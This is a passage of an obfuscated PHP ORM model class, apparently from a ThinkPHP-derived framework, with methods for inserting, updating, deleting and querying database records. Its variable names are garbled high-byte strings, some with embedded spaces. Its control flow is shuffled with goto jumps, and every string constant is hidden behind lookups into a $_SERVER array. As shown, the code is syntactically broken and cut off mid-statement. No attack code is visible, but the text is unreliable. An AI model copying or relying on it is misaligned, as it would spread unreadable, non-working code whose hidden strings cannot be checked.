Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\x65", "\x6f\162\144\x65\162", "\141\154\x69\141\163", "\x68\x61\166\151\156\x67", "\147\x72\x6f\x75\160", "\154\157\x63\153", "\x64\151\163\x74\151\156\143\x74", "\141\165\x74\157", "\146\x69\x6c\x74\x65\x72", "\166\141\x6c\x69\144\141\x74\x65", "\x72\145\163\165\x6c\x74", "\142\151\x6e\x64", "\164\x6f\x6b\x65\x6e"); public function __construct($dÛ à“¿¢á = '', $F°‚½Áêõå = '', $c¡çÄø©„‡ = '') { $D©©§¡©¨» =& $_SERVER[úÎü]; $this->_initialize(); if (!empty($dÛ à“¿¢á)) { if (strpos($dÛ à“¿¢á, $D©©§¡©¨»[91])) { list($this->dbName, $this->name) = explode($D©©§¡©¨»[91], $dÛ à“¿¢á); } else { $this->name = $dÛ à“¿¢á; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F°‚½Áêõå)) { $this->tablePrefix = $D©©§¡©¨»[33]; } elseif ($D©©§¡©¨»[33] != $F°‚½Áêõå) { $this->tablePrefix = $F°‚½Áêõå; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($D©©§¡©¨»[238]); } $this->db(0, empty($this->connection) ? $c¡çÄø©„‡ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $a ƒó’Ï¾« =& $_SERVER[úÎü]; if (empty($this->fields)) { if (think_config($a ƒó’Ï¾«[239])) { $A¹§­Ç‡Ş¤ = $this->dbName ? $this->dbName : think_config($a ƒó’Ï¾«[240]); $dİ›¼‚„âŠ = think_var_cache($a ƒó’Ï¾«[241] . strtolower(get_path_this($A¹§­Ç‡Ş¤) . $a ƒó’Ï¾«[91] . $this->name)); if ($dİ›¼‚„âŠ) { $eÒ¾õ‘»ò = think_config($a ƒó’Ï¾«[242]); if (empty($eÒ¾õ‘»ò) || $dİ›¼‚„âŠ[$a ƒó’Ï¾«[243]] == $eÒ¾õ‘»ò) { $this->fields = $dİ›¼‚„âŠ; return; } } } $this->flush(); } } public function flush() { goto EÆßó¨œ; EÆßó¨œ: $bˆæ¸—¬¡ =& $_SERVER[úÎü]; $this->db->setModel($this->name); $BËÅ·Úõ…é = $this->db->getFields($this->getTableName()); goto e™àİ‚œİÑ; aö÷âëÚÖŞ: if (think_config($bˆæ¸—¬¡[239])) { $eßŒÑÛ“¯Í = $this->dbName ? $this->dbName : think_config($bˆæ¸—¬¡[240]); think_var_cache($bˆæ¸—¬¡[241] . strtolower(get_path_this($eßŒÑÛ“¯Í) . $bˆæ¸—¬¡[91] . $this->name), $this->fields); } goto D°‘ñê¼‰•; e™àİ‚œİÑ: if (!$BËÅ·Úõ…é) { return !1; } $this->fields = array_keys($BËÅ·Úõ…é); $this->fields[$bˆæ¸—¬¡[244]] = !1; goto F¸ÛÆ„õ®‚; F¸ÛÆ„õ®‚: foreach ($BËÅ·Úõ…é as $bëê ŠÏ÷Ú => $A•ÎÍµãåÏ) { $E¿Ğ‹âìêë[$bëê ŠÏ÷Ú] = $A•ÎÍµãåÏ[$bˆæ¸—¬¡[29]]; if ($A•ÎÍµãåÏ[$bˆæ¸—¬¡[36]]) { $this->fields[$bˆæ¸—¬¡[245]] = $bëê ŠÏ÷Ú; if ($A•ÎÍµãåÏ[$bˆæ¸—¬¡[39]]) { $this->fields[$bˆæ¸—¬¡[244]] = !0; } } } $this->fields[$bˆæ¸—¬¡[246]] = $E¿Ğ‹âìêë; if (think_config($bˆæ¸—¬¡[242])) { $this->fields[$bˆæ¸—¬¡[243]] = think_config($bˆæ¸—¬¡[242]); } goto aö÷âëÚÖŞ; D°‘ñê¼‰•: } public function switchModel($d«âÄÈ·ˆ , $dÒƒ‚ì„ÅÌ = array()) { $a Îôİ¦šÊ =& $_SERVER[úÎü]; $CšìÂ´²Œñ = ucwords(strtolower($d«âÄÈ·ˆ )) . $a Îôİ¦šÊ[247]; if (!class_exists($CšìÂ´²Œñ)) { think_exception($CšìÂ´²Œñ . think_lang($a Îôİ¦šÊ[248])); } $this->_extModel = new $CšìÂ´²Œñ($this->name); if (!empty($dÒƒ‚ì„ÅÌ)) { foreach ($dÒƒ‚ì„ÅÌ as $DŠ¸±Ÿ¼¢ğ) { $this->_extModel->setProperty($DŠ¸±Ÿ¼¢ğ, $this->{$DŠ¸±Ÿ¼¢ğ}); } } return $this->_extModel; } public function __set($Aº‡¸·Îİš, $CÌª°„µÊŠ) { $this->data[$Aº‡¸·Îİš] = $CÌª°„µÊŠ; } public function __get($aÅŒŠÉÊ¸×) { return isset($this->data[$aÅŒŠÉÊ¸×]) ? $this->data[$aÅŒŠÉÊ¸×] : null; } public function __isset($eš²ì»¯) { return isset($this->data[$eš²ì»¯]); } public function __unset($fÇÉ‡ÒÈÁÖ) { unset($this->data[$fÇÉ‡ÒÈÁÖ]); } public function __call($DØ ãßÁÏÌ, $BØãàºé¬å) { $B¿âÃ“åõõ =& $_SERVER[úÎü]; if (in_array(strtolower($DØ ãßÁÏÌ), $this->methods, !0)) { $this->options[strtolower($DØ ãßÁÏÌ)] = $BØãàºé¬å[0]; return $this; } elseif (in_array(strtolower($DØ ãßÁÏÌ), array($B¿âÃ“åõõ[249], $B¿âÃ“åõõ[250], $B¿âÃ“åõõ[251], $B¿âÃ“åõõ[252], $B¿âÃ“åõõ[253]), !0)) { $a¼ØğÏÓ’„ = isset($BØãàºé¬å[0]) ? $BØãàºé¬å[0] : $B¿âÃ“åõõ[180]; $a¼ØğÏÓ’„ = $this->db->parseKey($a¼ØğÏÓ’„); return $this->getField(strtoupper($DØ ãßÁÏÌ) . $B¿âÃ“åõõ[254] . $a¼ØğÏÓ’„ . $B¿âÃ“åõõ[255] . $DØ ãßÁÏÌ, $B¿âÃ“åõõ[249]); } elseif (strtolower(substr($DØ ãßÁÏÌ, 0, 5)) == $B¿âÃ“åõõ[256]) { $a¼ØğÏÓ’„ = think_parse_name(substr($DØ ãßÁÏÌ, 5)); $A£²Ó‘’¿Í[$a¼ØğÏÓ’„] = $BØãàºé¬å[0]; return $this->where($A£²Ó‘’¿Í)->find(); } elseif (strtolower(substr($DØ ãßÁÏÌ, 0, 10)) == $B¿âÃ“åõõ[257]) { $DÒÁòÑĞŠö = think_parse_name(substr($DØ ãßÁÏÌ, 10)); $A£²Ó‘’¿Í[$DÒÁòÑĞŠö] = $BØãàºé¬å[0]; return $this->where($A£²Ó‘’¿Í)->getField($BØãàºé¬å[1]); } elseif (isset($this->_scope[$DØ ãßÁÏÌ])) { return $this->scope($DØ ãßÁÏÌ, $BØãàºé¬å[0]); } elseif (method_exists($this, $DØ ãßÁÏÌ)) { array_unshift($BØãàºé¬å, $DØ ãßÁÏÌ); return call_user_func_array(array($this, $B¿âÃ“åõõ[258]), $BØãàºé¬å); } else { return call_user_func_array(array(parent, $DØ ãßÁÏÌ), $BØãàºé¬å); } } protected function call() { goto b…ŠÍÛğù½; F÷‘«óÀ‘¶: if (isset($C–Çé Ô²¤[$Cåáø·İÔ]) && $C–Çé Ô²¤[$Cåáø·İÔ] === $bÃÏ½®¾Æº) { think_exception(__CLASS__ . $a¦ï¨ë…“[4] . $bÃÏ½®¾Æº . think_lang($a¦ï¨ë…“[259])); return; } $C–Çé Ô²¤[] = $bÃÏ½®¾Æº; if (method_exists($this, $a¦ï¨ë…“[260])) { $Bö›Ü«æÀ• = call_user_func_array(array($this, $a¦ï¨ë…“[261]), array($B˜×ª¬Åî, $C–Çé Ô²¤)); if (!is_null($Bö›Ü«æÀ•) && $Bö›Ü«æÀ• !== !1) { return $Bö›Ü«æÀ•; } } goto D–¯ëĞ”Õ°; fŸ¹ƒà¤º: $B˜×ª¬Åî = $bÃÏ½®¾Æº; if (is_array($bÃÏ½®¾Æº)) { $B˜×ª¬Åî = $bÃÏ½®¾Æº[1]; $bÃÏ½®¾Æº = $bÃÏ½®¾Æº[0]; } $Cåáø·İÔ = count($C–Çé Ô²¤) - 1; goto F÷‘«óÀ‘¶; D–¯ëĞ”Õ°: $a³Ãø¤Âãî = call_user_func_array(array($this, $bÃÏ½®¾Æº), $C–Çé Ô²¤); if (method_exists($this, $a¦ï¨ë…“[262])) { $Bö›Ü«æÀ• = call_user_func_array(array($this, $a¦ï¨ë…“[263]), array($B˜×ª¬Åî, $C–Çé Ô²¤, $a³Ãø¤Âãî)); if ($Bö›Ü«æÀ•) { return $Bö›Ü«æÀ•; } } return $a³Ãø¤Âãî; goto BäöÒÁ‰ˆ»; b…ŠÍÛğù½: $a¦ï¨ë…“ =& $_SERVER[úÎü]; $C–Çé Ô²¤ = func_get_args(); $bÃÏ½®¾Æº = array_shift($C–Çé Ô²¤); goto fŸ¹ƒà¤º; BäöÒÁ‰ˆ»: } protected function _initialize() { } protected function _facade($BÉê³ñ£‰´) { $b‡—²¦œ„Œ =& $_SERVER[úÎü]; if (!empty($this->fields)) { foreach ($BÉê³ñ£‰´ as $BÈæ‡Æ…­ => $b„„½ÒƒÓ¤) { if (is_array($this->fields) && !in_array($BÈæ‡Æ…­, $this->fields, !0)) { unset($BÉê³ñ£‰´[$BÈæ‡Æ…­]); } elseif (is_scalar($b„„½ÒƒÓ¤)) { $this->_parseType($BÉê³ñ£‰´, $BÈæ‡Æ…­); } } } if (!empty($this->options[$b‡—²¦œ„Œ[264]])) { $BÉê³ñ£‰´ = array_map($this->options[$b‡—²¦œ„Œ[264]], $BÉê³ñ£‰´); unset($this->options[$b‡—²¦œ„Œ[264]]); } $this->_beforeWrite($BÉê³ñ£‰´); return $BÉê³ñ£‰´; } protected function _beforeWrite(&$Cù‘Ã“ˆâ„) { } public function add($e’ˆ¢ò¦ğÀ = '', $Dğ’˜ªÊóÓ = array(), $bó Ï‰çš = false) { goto B ØÍÕ“Ä; d±¡¹ÅêÍí: if (!1 === $this->_beforeInsert($e’ˆ¢ò¦ğÀ, $Dğ’˜ªÊóÓ)) { return !1; } $BìÂİºñÎ = $this->db->insert($e’ˆ¢ò¦ğÀ, $Dğ’˜ªÊóÓ, $bó Ï‰çš); if (!1 !== $BìÂİºñÎ) { $DçÉšŠİ³Å = $this->getLastInsID(); if ($DçÉšŠİ³Å) { $e’ˆ¢ò¦ğÀ[$this->getPk()] = $DçÉšŠİ³Å; $this->_after_insert($e’ˆ¢ò¦ğÀ, $Dğ’˜ªÊóÓ); return $DçÉšŠİ³Å; } $this->_after_insert($e’ˆ¢ò¦ğÀ, $Dğ’˜ªÊóÓ); } goto F„ŒÙÖºáâ; F„ŒÙÖºáâ: return $BìÂİºñÎ; goto F’´Äµ‘–ç; B ØÍÕ“Ä: if (empty($e’ˆ¢ò¦ğÀ)) { if (!empty($this->data)) { $e’ˆ¢ò¦ğÀ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[úÎü][265]); return !1; } } $Dğ’˜ªÊóÓ = $this->_parseOptions($Dğ’˜ªÊóÓ); $e’ˆ¢ò¦ğÀ = $this->_facade($e’ˆ¢ò¦ğÀ); goto d±¡¹ÅêÍí; F’´Äµ‘–ç: } protected function _beforeInsert(&$E¿…·™ÃÈâ, $FµĞàĞ¨ÄÂ) { } protected function _after_insert($FÈ œù£—†, $Fà‘ëä÷æ§) { } public function addAll($e¸¬ì¼Š, $A‰ö¿ó°„ß = array(), $bÇÌÌáå£³ = false) { goto bœ¨…¨‹³; D’ó§õöéÁ: return $B˜“¥ƒÕ´; goto BÙõòÏãĞ; bœ¨…¨‹³: $BªÅËïĞÁ =& $_SERVER[úÎü]; if (empty($e¸¬ì¼Š)) { $this->error = think_lang($BªÅËïĞÁ[265]); return !1; } $A‰ö¿ó°„ß = $this->_parseOptions($A‰ö¿ó°„ß); goto B£å‡Ó¬÷Ï; B£å‡Ó¬÷Ï: foreach ($e¸¬ì¼Š as $AÜä‰ãõáø => $c•İß¸„è÷) { $e¸¬ì¼Š[$AÜä‰ãõáø] = $this->_facade($c•İß¸„è÷); } if (method_exists($this->db, $BªÅËïĞÁ[266])) { $B˜“¥ƒÕ´ = $this->db->insertAll($e¸¬ì¼Š, $A‰ö¿ó°„ß, $bÇÌÌáå£³); } else { $this->startTrans(); foreach ($e¸¬ì¼Š as $AÜä‰ãõáø => $c•İß¸„è÷) { $B˜“¥ƒÕ´ = $this->db->insert($c•İß¸„è÷, $A‰ö¿ó°„ß, $bÇÌÌáå£³); } $this->commit(); } if (!1 !== $B˜“¥ƒÕ´) { $BÓè¤Öìä® = $this->getLastInsID(); if ($BÓè¤Öìä®) { return $BÓè¤Öìä®; } } goto D’ó§õöéÁ; BÙõòÏãĞ: } public function selectAdd($e—øÍä÷Åñ = '', $E¥‰„Êèƒõ = '', $AÀ”òÒ†à™ = array()) { $aâÆÉ†¤… =& $_SERVER[úÎü]; $AÀ”òÒ†à™ = $this->_parseOptions($AÀ”òÒ†à™); if (!1 === ($eÌšº“ï¶” = $this->db->selectInsert($e—øÍä÷Åñ ? $e—øÍä÷Åñ : $AÀ”òÒ†à™[$aâÆÉ†¤…[267]], $E¥‰„Êèƒõ ? $E¥‰„Êèƒõ : $this->getTableName(), $AÀ”òÒ†à™))) { $this->error = think_lang($aâÆÉ†¤…[268]); return !1; } else { return $eÌšº“ï¶”; } } public function save($FÜ¥ïÕÉâ¹ = '', $FŒÎÁ¿£…× = array()) { goto cËã´ñØÜŠ; béô°öì„ù: if (is_array($FŒÎÁ¿£…×[$B¡¹ßŞÁ[269]]) && isset($FŒÎÁ¿£…×[$B¡¹ßŞÁ[269]][$F‹òÛß‚Ã])) { $d²ô¡ˆÖ„” = $FŒÎÁ¿£…×[$B¡¹ßŞÁ[269]][$F‹òÛß‚Ã]; } if (!1 === $this->_beforeUpdate($FÜ¥ïÕÉâ¹, $FŒÎÁ¿£…×)) { return !1; } $dÈ¨½Œà÷… = $this->db->update($FÜ¥ïÕÉâ¹, $FŒÎÁ¿£…×); goto d†ÂóÖõ”Ã; d†ÂóÖõ”Ã: if (!1 !== $dÈ¨½Œà÷…) { if (isset($d²ô¡ˆÖ„”)) { $FÜ¥ïÕÉâ¹[$F‹òÛß‚Ã] = $d²ô¡ˆÖ„”; } $this->_afterUpdate($FÜ¥ïÕÉâ¹, $FŒÎÁ¿£…×); } return $dÈ¨½Œà÷…; goto b®ŠŸ£Õ£Ş; cËã´ñØÜŠ: $B¡¹ßŞÁ =& $_SERVER[úÎü]; if (empty($FÜ¥ïÕÉâ¹)) { if (!empty($this->data)) { $FÜ¥ïÕÉâ¹ = $this->data; $this->data = array(); } else { $this->error = think_lang($B¡¹ßŞÁ[265]); return !1; } } $FÜ¥ïÕÉâ¹ = $this->_facade($FÜ¥ïÕÉâ¹); goto FÃ¹¶â¾öæ; FÃ¹¶â¾öæ: $FŒÎÁ¿£…× = $this->_parseOptions($FŒÎÁ¿£…×); $F‹òÛß‚Ã = $this->getPk(); if (!isset($FŒÎÁ¿£…×[$B¡¹ßŞÁ[269]])) { if (isset($FÜ¥ïÕÉâ¹[$F‹òÛß‚Ã])) { $fµ¢»ø§–İ[$F‹òÛß‚Ã] = $FÜ¥ïÕÉâ¹[$F‹òÛß‚Ã]; $FŒÎÁ¿£…×[$B¡¹ßŞÁ[269]] = $fµ¢»ø§–İ; unset($FÜ¥ïÕÉâ¹[$F‹òÛß‚Ã]); } else { $this->error = think_lang($B¡¹ßŞÁ[268]); return !1; } } goto béô°öì„ù; b®ŠŸ£Õ£Ş: } protected function _beforeUpdate(&$f³•ö­šï, $eà†æµÄË) { } protected function _afterUpdate($f“«¾º˜â, $Eê‡ªù“‰Á) { } public function delete($E­óµìí— = array()) { goto DéÄ¡•„æ¤; Eºù­©Àµ: $Aƒ³»ºñó¬ = $this->db->delete($E­óµìí—); if (!1 !== $Aƒ³»ºñó¬) { $F”ƒØø„È« = array(); if (isset($d½óÍÂ³Ü)) { $F”ƒØø„È«[$E•Ò½Şğİ¦] = $d½óÍÂ³Ü; } $this->_after_delete($F”ƒØø„È«, $E­óµìí—); } return $Aƒ³»ºñó¬; goto fîçäè´ó¥; a²ø´‘Í®Ú: if (is_numeric($E­óµìí—) || is_string($E­óµìí—)) { if (strpos($E­óµìí—, $fˆ¬½ßá£[47])) { $fÌæÈÍ“¼Û[$E•Ò½Şğİ¦] = array($fˆ¬½ßá£[270], $E­óµìí—); } else { $fÌæÈÍ“¼Û[$E•Ò½Şğİ¦] = $E­óµìí—; } $this->options[$fˆ¬½ßá£[269]] = $fÌæÈÍ“¼Û; } $E­óµìí— = $this->_parseOptions(); if (is_array($E­óµìí—[$fˆ¬½ßá£[269]]) && isset($E­óµìí—[$fˆ¬½ßá£[269]][$E•Ò½Şğİ¦])) { $d½óÍÂ³Ü = $E­óµìí—[$fˆ¬½ßá£[269]][$E•Ò½Şğİ¦]; } goto Eºù­©Àµ; DéÄ¡•„æ¤: $fˆ¬½ßá£ =& $_SERVER[úÎü]; if (empty($E­óµìí—) && empty($this->options[$fˆ¬½ßá£[269]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $E•Ò½Şğİ¦ = $this->getPk(); goto a²ø´‘Í®Ú; fîçäè´ó¥: } protected function _after_delete($EÊ’ÎØ°éÍ, $d›°êØ„ä) { } public function select($EÁİ—í¿Û› = array()) { goto D„ë±ßçÆ; FšÖØßîï‚: $E¹ØîŒ«³‰ = $this->db->select($EÁİ—í¿Û›); if (!1 === $E¹ØîŒ«³‰) { return !1; } if (empty($E¹ØîŒ«³‰)) { return null; } goto D­‡¬İ¹ñ; D„ë±ßçÆ: $aÌ†ÇÑ†¶º =& $_SERVER[úÎü]; if (is_string($EÁİ—í¿Û›) || is_numeric($EÁİ—í¿Û›)) { $E×ÚÌœ­ö‘ = $this->getPk(); if (strpos($EÁİ—í¿Û›, $aÌ†ÇÑ†¶º[47])) { $BøëÚ£”éÇ[$E×ÚÌœ­ö‘] = array($aÌ†ÇÑ†¶º[270], $EÁİ—í¿Û›); } else { $BøëÚ£”éÇ[$E×ÚÌœ­ö‘] = $EÁİ—í¿Û›; } $this->options[$aÌ†ÇÑ†¶º[269]] = $BøëÚ£”éÇ; } elseif (!1 === $EÁİ—í¿Û›) { $EÁİ—í¿Û› = $this->_parseOptions(); return $aÌ†ÇÑ†¶º[271] . $this->db->buildSelectSql($EÁİ—í¿Û›) . $aÌ†ÇÑ†¶º[272]; } $EÁİ—í¿Û› = $this->_parseOptions(); goto FšÖØßîï‚; D­‡¬İ¹ñ: $this->_afterSelect($E¹ØîŒ«³‰, $EÁİ—í¿Û›); return $E¹ØîŒ«³‰; goto e°ÔÃÔ¸¤¿; e°ÔÃÔ¸¤¿: } protected function _afterSelect(&$dçÒµğ…­…, $dÊ†æÔÇ†–) { } public function buildSql($döá±éëº† = array()) { $e£¼Üèº =& $_SERVER[úÎü]; $döá±éëº† = $this->_parseOptions($döá±éëº†); return $e£¼Üèº[271] . $this->db->buildSelectSql($döá±éëº†) . $e£¼Üèº[272]; } public function optionsValue($bºª¢ÄØº© = null) { if (is_null($bºª¢ÄØº©)) { return $this->options; } elseif (is_array($bºª¢ÄØº©)) { $this->options = array_merge($this->options, $bºª¢ÄØº©); } } protected function _parseOptions($dßäß¸×ÛÚ = array()) { goto dáéµÙï¡‹; dáéµÙï¡‹: $BµãêñƒÍí =& $_SERVER[úÎü]; if (is_array($dßäß¸×ÛÚ)) { $dßäß¸×ÛÚ = array_merge($this->options, $dßäß¸×ÛÚ); } $this->options = array(); goto f†‡ÅÓ‰Ä¼; Bì™ÒÊ¿Â: if (isset($dßäß¸×ÛÚ[$BµãêñƒÍí[269]]) && is_array($dßäß¸×ÛÚ[$BµãêñƒÍí[269]]) && !empty($cÌÓßøØç) && !isset($dßäß¸×ÛÚ[$BµãêñƒÍí[276]]) && !isset($dßäß¸×ÛÚ[$BµãêñƒÍí[273]])) { foreach ($dßäß¸×ÛÚ[$BµãêñƒÍí[269]] as $aÈ‚ğƒ ñ• => $fĞï‹Œõ‹‚) { $aÈ‚ğƒ ñ• = trim($aÈ‚ğƒ ñ•); if (in_array($aÈ‚ğƒ ñ•, $cÌÓßøØç, !0)) { if (is_scalar($fĞï‹Œõ‹‚)) { $this->_parseType($dßäß¸×ÛÚ[$BµãêñƒÍí[269]], $aÈ‚ğƒ ñ•); } } elseif (!is_numeric($aÈ‚ğƒ ñ•) && $BµãêñƒÍí[70] != substr($aÈ‚ğƒ ñ•, 0, 1) && !1 === strpos($aÈ‚ğƒ ñ•, $BµãêñƒÍí[91]) && !1 === strpos($aÈ‚ğƒ ñ•, $BµãêñƒÍí[254]) && !1 === strpos($aÈ‚ğƒ ñ•, $BµãêñƒÍí[277]) && !1 === strpos($aÈ‚ğƒ ñ•, $BµãêñƒÍí[278])) { unset($dßäß¸×ÛÚ[$BµãêñƒÍí[269]][$aÈ‚ğƒ ñ•]); } } } $this->_options_filter($dßäß¸×ÛÚ); return $dßäß¸×ÛÚ; goto DÚšìŸ™Œ; f†‡ÅÓ‰Ä¼: if (!isset($dßäß¸×ÛÚ[$BµãêñƒÍí[273]])) { $dßäß¸×ÛÚ[$BµãêñƒÍí[273]] = $this->getTableName(); $cÌÓßøØç = $this->fields; } else { $cÌÓßøØç = $this->getDbFields(); } if (!empty($dßäß¸×ÛÚ[$BµãêñƒÍí[274]])) { $dßäß¸×ÛÚ[$BµãêñƒÍí[273]] .= $BµãêñƒÍí[50] . $dßäß¸×ÛÚ[$BµãêñƒÍí[274]]; } $dßäß¸×ÛÚ[$BµãêñƒÍí[275]] = $this->name; goto Bì™ÒÊ¿Â; DÚšìŸ™Œ: } protected function _options_filter(&$E…ãŠ’Øˆ´) { } protected function _parseType(&$c˜î•İñ†, $c¬ÓîÎ†…ß) { $Bââ•îÕ ” =& $_SERVER[úÎü]; if (empty($this->options[$Bââ•îÕ ”[279]][$Bââ•îÕ ”[4] . $c¬ÓîÎ†…ß])) { $FÍï¬¿×’ğ = strtolower($this->fields[$Bââ•îÕ ”[246]][$c¬ÓîÎ†…ß]); if (!1 !== strpos($FÍï¬¿×’ğ, $Bââ•îÕ ”[280])) { } elseif (!1 === strpos($FÍï¬¿×’ğ, $Bââ•îÕ ”[281]) && !1 !== strpos($FÍï¬¿×’ğ, $Bââ•îÕ ”[282])) { $c˜î•İñ†[$c¬ÓîÎ†…ß] = intval($c˜î•İñ†[$c¬ÓîÎ†…ß]); } elseif (!1 !== strpos($FÍï¬¿×’ğ, $Bââ•îÕ ”[283]) || !1 !== strpos($FÍï¬¿×’ğ, $Bââ•îÕ ”[284])) { $c˜î•İñ†[$c¬ÓîÎ†…ß] = floatval($c˜î•İñ†[$c¬ÓîÎ†…ß]); } elseif (!1 !== strpos($FÍï¬¿×’ğ, $Bââ•îÕ ”[285])) { $c˜î•İñ†[$c¬ÓîÎ†…ß] = (bool) $c˜î•İñ†[$c¬ÓîÎ†…ß]; } } } public function find($céÁ¯›„ô  = array()) { goto E¶Üó³¨Ôƒ; A—ŸºÜŠÛ: if (!empty($this->options[$F˜íÛòÁƒ[287]])) { return $this->returnResult($this->data, $this->options[$F˜íÛòÁƒ[287]]); } return $this->data; goto cµìŠ‡ÒÂ; cÍùÓ»êÇò: $céÁ¯›„ô  = $this->_parseOptions(); $FÁæÁä¹×† = $this->db->select($céÁ¯›„ô ); if (!1 === $FÁæÁä¹×†) { return !1; } goto b½íÕÑ–; E¶Üó³¨Ôƒ: $F˜íÛòÁƒ =& $_SERVER[úÎü]; if (is_numeric($céÁ¯›„ô ) || is_string($céÁ¯›„ô )) { $d°Ğ¿Ø¹[$this->getPk()] = intval($céÁ¯›„ô ); $this->options[$F˜íÛòÁƒ[269]] = $d°Ğ¿Ø¹; } $this->options[$F˜íÛòÁƒ[286]] = 1; goto cÍùÓ»êÇò; b½íÕÑ–: if (empty($FÁæÁä¹×†)) { return null; } $this->data = $FÁæÁä¹×†[0]; $this->_afterFind($this->data, $céÁ¯›„ô ); goto A—ŸºÜŠÛ; cµìŠ‡ÒÂ: } protected function _afterFind(&$AÏì¥öñî, $D±òùêŠ·ù) { } protected function returnResult($E–ğä´ÆÖø, $FŒ²…Õºá³ = '') { $f”‘ÆƒŠù =& $_SERVER[úÎü]; if ($FŒ²…Õºá³) { if (is_callable($FŒ²…Õºá³)) { return call_user_func($FŒ²…Õºá³, $E–ğä´ÆÖø); } switch (strtolower($FŒ²…Õºá³)) { case $f”‘ÆƒŠù[288]: return json_encode($E–ğä´ÆÖø); case $f”‘ÆƒŠù[289]: return xml_encode($E–ğä´ÆÖø); } } return $E–ğä´ÆÖø; } public function parseFieldsMap($Aõò•ìÙê‚, $f¡Ã×Î×´Î = 1) { if (!empty($this->_map)) { foreach ($this->_map as $e¸“èåÓÅÓ => $bÛÜôç÷˜¹) { if ($f¡Ã×Î×´Î == 1) { if (isset($Aõò•ìÙê‚[$bÛÜôç÷˜¹])) { $Aõò•ìÙê‚[$e¸“èåÓÅÓ] = $Aõò•ìÙê‚[$bÛÜôç÷˜¹]; unset($Aõò•ìÙê‚[$bÛÜôç÷˜¹]); } } else { if (isset($Aõò•ìÙê‚[$e¸“èåÓÅÓ])) { $Aõò•ìÙê‚[$bÛÜôç÷˜¹] = $Aõò•ìÙê‚[$e¸“èåÓÅÓ]; unset($Aõò•ìÙê‚[$e¸“èåÓÅÓ]); } } } } return $Aõò•ìÙê‚; } public function setField($dè«¾ƒ°¸À, $aùôâºò–³ = '') { if (is_array($dè«¾ƒ°¸À)) { $CİÂÔä¤©½ = $dè«¾ƒ°¸À; } else { $CİÂÔä¤©½[$dè«¾ƒ°¸À] = $aùôâºò–³; } return $this->save($CİÂÔä¤©½); } public function setAdd($DØÙ‘¼×í¹, $F–Ê¦ÙÂ‘É = 1) { $E–½ÎÊ¬°â =& $_SERVER[úÎü]; $c½½ßÃ† = $DØÙ‘¼×í¹ . $E–½ÎÊ¬°â[290] . $F–Ê¦ÙÂ‘É; if ($F–Ê¦ÙÂ‘É < 0) { $c½½ßÃ† = $DØÙ‘¼×í¹ . $F–Ê¦ÙÂ‘É; } return $this->setField($DØÙ‘¼×í¹, array($E–½ÎÊ¬°â[291], $c½½ßÃ†)); } public function getField($EÎªÈâ£Óğ, $FãÏÓ¼ÂÍ§ = null) { $d‚ÇŞ’šì˜ =& $_SERVER[úÎü]; $e¼Ÿ ·•Û[$d‚ÇŞ’šì˜[267]] = $EÎªÈâ£Óğ; $e¼Ÿ ·•Û = $this->_parseOptions($e¼Ÿ ·•Û); $EÎªÈâ£Óğ = trim($EÎªÈâ£Óğ); if (strpos($EÎªÈâ£Óğ, $d‚ÇŞ’šì˜[47])) { if (!isset($e¼Ÿ ·•Û[$d‚ÇŞ’šì˜[286]])) { $e¼Ÿ ·•Û[$d‚ÇŞ’šì˜[286]] = is_numeric($FãÏÓ¼ÂÍ§) ? $FãÏÓ¼ÂÍ§ : $d‚ÇŞ’šì˜[33]; } $E ƒ—·ÎÔŸ = $this->db->select($e¼Ÿ ·•Û); if (!empty($E ƒ—·ÎÔŸ)) { goto EˆØéëÁŠ„; EˆØéëÁŠ„: $aœÊØ±ù´â = explode($d‚ÇŞ’šì˜[47], $EÎªÈâ£Óğ); $EÎªÈâ£Óğ = array_keys($E ƒ—·ÎÔŸ[0]); $aÄ½ƒÚ’ëÁ = array_shift($EÎªÈâ£Óğ); goto eìƒ²ÀñÉ«; Aä‚¶¾‡¹: foreach ($E ƒ—·ÎÔŸ as $B÷ˆŠ‚â´î) { $bô‡Ğ…Ùß = $B÷ˆŠ‚â´î[$aÄ½ƒÚ’ëÁ]; if (2 == $A†˜ˆ†ÔÃï) { $Eô“ß´‘“[$bô‡Ğ…Ùß] = $B÷ˆŠ‚â´î[$F—šº¢ĞÖ¯]; } else { $Eô“ß´‘“[$bô‡Ğ…Ùß] = is_string($FãÏÓ¼ÂÍ§) ? implode($FãÏÓ¼ÂÍ§, $B÷ˆŠ‚â´î) : $B÷ˆŠ‚â´î; } } return $Eô“ß´‘“; goto a¥˜»õ¾„Ø; eìƒ²ÀñÉ«: $F—šº¢ĞÖ¯ = array_shift($EÎªÈâ£Óğ); $Eô“ß´‘“ = array(); $A†˜ˆ†ÔÃï = count($aœÊØ±ù´â); goto Aä‚¶¾‡¹; a¥˜»õ¾„Ø: } } else { if (!0 !== $FãÏÓ¼ÂÍ§) { $e¼Ÿ ·•Û[$d‚ÇŞ’šì˜[286]] = is_numeric($FãÏÓ¼ÂÍ§) ? $FãÏÓ¼ÂÍ§ : 1; } if ($FãÏÓ¼ÂÍ§ === $d‚ÇŞ’šì˜[249]) { unset($e¼Ÿ ·•Û[$d‚ÇŞ’šì˜[286]]); } $B÷ˆŠ‚â´î = $this->db->select($e¼Ÿ ·•Û); if (!empty($B÷ˆŠ‚â´î)) { if ($FãÏÓ¼ÂÍ§ === $d‚ÇŞ’šì˜[249]) { return reset($B÷ˆŠ‚â´î[0]); } if (!0 !== $FãÏÓ¼ÂÍ§ && 1 == $e¼Ÿ ·•Û[$d‚ÇŞ’šì˜[286]]) { return reset($B÷ˆŠ‚â´î[0]); } foreach ($B÷ˆŠ‚â´î as $EäôöÊ±‘) { $B³«¬¥ÖÂ[] = $EäôöÊ±‘[$EÎªÈâ£Óğ]; } return $B³«¬¥ÖÂ; } } return null; } public function create($bµœÒ­× = '', $AªÖ£Ò‚©† = '') { goto D±À¦ôšï˜; cšå£Ú•ä…: $bµœÒ­× = 